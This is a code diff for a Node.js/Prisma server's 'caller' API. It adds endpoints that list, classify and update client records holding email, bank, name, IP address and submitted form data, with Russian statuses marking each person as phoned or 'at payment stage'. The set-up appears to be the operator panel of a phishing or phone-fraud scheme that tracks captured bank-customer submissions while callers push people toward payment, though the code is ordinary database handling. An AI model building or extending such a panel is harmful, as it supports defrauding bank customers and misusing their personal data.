@@ -504,22 +504,20 @@ async function handleCallerLogin(req, reply) {
 async function handleCallerClients(req, reply) {
   if (!requireCaller(req, reply)) return;
   try {
-    // Full select including new fields (requires prisma db push on server)
     const clients = await prisma.webClient.findMany({
       where: { callRequested: true },
       orderBy: { updatedAt: 'desc' },
       select: {
         id: true, flowSessionId: true, email: true, bank: true,
-        nombre: true, ip: true, status: true,
+        nombre: true, ip: true, status: true, clientType: true,
         operatorCalled: true, calledAt: true, createdAt: true,
-        callerNote: true, submissionData: true,
+        callerNote: true, operatorStatus: true, submissionData: true,
         events: { orderBy: { createdAt: 'asc' }, select: { event: true, createdAt: true } },
       },
     });
     return reply.send({ clients });
   } catch (err) {
     console.error('[caller-clients] primary query error, trying fallback:', err?.message || err);
-    // Fallback: DB not yet migrated (callerNote column missing) — omit new field
     try {
       const clients = await prisma.webClient.findMany({
         where: { callRequested: true },
@@ -528,7 +526,7 @@ async function handleCallerClients(req, reply) {
           id: true, flowSessionId: true, email: true, bank: true,
           nombre: true, ip: true, status: true,
           operatorCalled: true, calledAt: true, createdAt: true,
-          submissionData: true,
+          callerNote: true, submissionData: true,
           events: { orderBy: { createdAt: 'asc' }, select: { event: true, createdAt: true } },
         },
       });
@@ -537,6 +535,96 @@ async function handleCallerClients(req, reply) {
       console.error('[caller-clients] fallback error:', err2?.message || err2);
       return reply.status(500).send({ error: 'server_error' });
     }
+  }
+}
+
+async function handleCallerSetOperatorStatus(req, reply) {
+  if (!requireCaller(req, reply)) return;
+  try {
+    const id = sanitizeString(req.params.id || '', 40);
+    const body = asRecord(req.body) ?? {};
+    const status = sanitizeString(getString(body.status), 20);
+    if (!['pending', 'called', 'payment'].includes(status)) {
+      return reply.status(400).send({ error: 'invalid_status' });
+    }
+    const data = { operatorStatus: status };
+    if (status !== 'pending') {
+      data.operatorCalled = true;
+      data.calledAt = new Date();
+      data.status = status === 'payment' ? 'НА ЭТАПЕ ОПЛАТЫ' : 'ОПЕРАТОР ПРОЗВОНИЛ';
+    } else {
+      data.operatorCalled = false;
+      data.calledAt = null;
+    }
+    try {
+      await prisma.webClient.update({ where: { id }, data });
+    } catch (fieldErr) {
+      if (fieldErr?.message?.includes('operatorStatus') || fieldErr?.code === 'P2022') {
+        const { operatorStatus: _s, ...fallbackData } = data;
+        await prisma.webClient.update({ where: { id }, data: fallbackData });
+      } else {
+        throw fieldErr;
+      }
+    }
+    broadcastUpdate('clients_changed');
+    return reply.send({ ok: true });
+  } catch (err) {
+    console.error('[caller-set-status] error:', err?.message || err);
+    return reply.status(500).send({ error: 'server_error' });
+  }
+}
+
+async function handleCallerOldClients(req, reply) {
+  if (!requireCaller(req, reply)) return;
+  try {
+    const clients = await prisma.webClient.findMany({
+      where: { clientType: 'olduser' },
+      orderBy: { updatedAt: 'desc' },
+      select: {
+        id: true, flowSessionId: true, email: true, bank: true,
+        nombre: true, ip: true, status: true, clientType: true,
+        operatorCalled: true, calledAt: true, createdAt: true,
+        callerNote: true, operatorStatus: true, submissionData: true,
+        events: { orderBy: { createdAt: 'asc' }, select: { event: true, createdAt: true } },
+      },
+    });
+    return reply.send({ clients });
+  } catch (err) {
+    console.error('[caller-old-clients] fallback:', err?.message || err);
+    try {
+      const clients = await prisma.webClient.findMany({
+        orderBy: { updatedAt: 'desc' },
+        take: 200,
+        select: {
+          id: true, flowSessionId: true, email: true, bank: true,
+          nombre: true, ip: true, status: true,
+          operatorCalled: true, calledAt: true, createdAt: true,
+          callerNote: true, submissionData: true,
+          events: { orderBy: { createdAt: 'asc' }, select: { event: true, createdAt: true } },
+        },
+      });
+      return reply.send({ clients, _warning: 'db_migration_needed' });
+    } catch (err2) {
+      return reply.status(500).send({ error: 'server_error' });
+    }
+  }
+}
+
+async function handleCallerSetClientType(req, reply) {
+  if (!requireCaller(req, reply)) return;
+  try {
+    const id = sanitizeString(req.params.id || '', 40);
+    const body = asRecord(req.body) ?? {};
+    const type = sanitizeString(getString(body.type), 20);
+    if (!['newuser', 'olduser'].includes(type)) {
+      return reply.status(400).send({ error: 'invalid_type' });
+    }
+    await prisma.webClient.update({ where: { id }, data: { clientType: type } });
+    broadcastUpdate('clients_changed');
+    return reply.send({ ok: true });
+  } catch (err) {
+    console.error('[caller-set-client-type] error:', err?.message || err);
+    return reply.status(500).send({ error: 'server_error' });
   }
 }
 
@@ -890,6 +978,9 @@ export async function registerApiRoutes(app) {
   app.get('/api/caller/clients', handleCallerClients);
   app.post('/api/caller/clients/:id/called', handleCallerMarkCalled);
   app.put('/api/caller/clients/:id/note', handleCallerNote);
+  app.put('/api/caller/clients/:id/operator-status', handleCallerSetOperatorStatus);
+  app.put('/api/caller/clients/:id/client-type', handleCallerSetClientType);
+  app.get('/api/caller/old-clients', handleCallerOldClients);
   app.get('/api/caller/call-logs', handleGetCallLogs);
   app.post('/api/caller/call-logs', handleAddCallLog);
   app.post('/api/caller/call-logs/:id/mark', handleMarkCallLog);
